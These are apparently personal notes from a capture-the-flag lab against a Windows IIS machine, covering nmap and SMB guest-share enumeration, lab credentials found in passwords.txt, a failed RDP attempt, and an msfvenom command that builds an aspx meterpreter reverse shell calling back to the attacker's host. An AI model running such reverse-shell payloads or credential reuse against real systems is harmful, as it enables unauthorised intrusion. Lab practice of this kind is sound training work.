### Relevant ###

export IP=10.10.137.137

# Http-TRACE
nmap showed that http-trace method was enabled..so tried that but no luck there...
because i tried -X TRACE with curl but no response was recieved:so i am assuming that its not enabled anymore(Because TRACE works only on older versions of browsers)

# SMB:

nmap showed smb was enabled and guest login was also enabled:

found 4 shares:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      

nt4wrksv had guest login enabled and found passwords.txt

Found an encoded password:Decoded:Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
will try xfreerdp into the machine
# Xfreerdp:
xfreerdp /u:Bill /p:Juw4nnaM4n420696969/v:10.10.200.161$$ /v:10.10.200.161

This didnt work:
#TODO:Figure out where to use the credentials found

Tried smbclient to access the other available shares but got access denied or NT_STATUS_INVALID_INFO_CLASS listing \*

nmap -p- showed 2 more ports having http services enabled..but running bobuster against them isnt working mayb my wordlist is incorrect...

#TODO: use my kali to check if thats the case(OF wordlist)

well it turns out it was my wordlist :/....

got that 'nt4wrksv' is a directory 
and its the same as the smbshare...

using msfvenom to have a rev_shell (In aspx because its windows IIS (I didnt know that ofc lol))

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.40.42 LPORT=5555 -f aspx -o meter_rev_shell.aspx  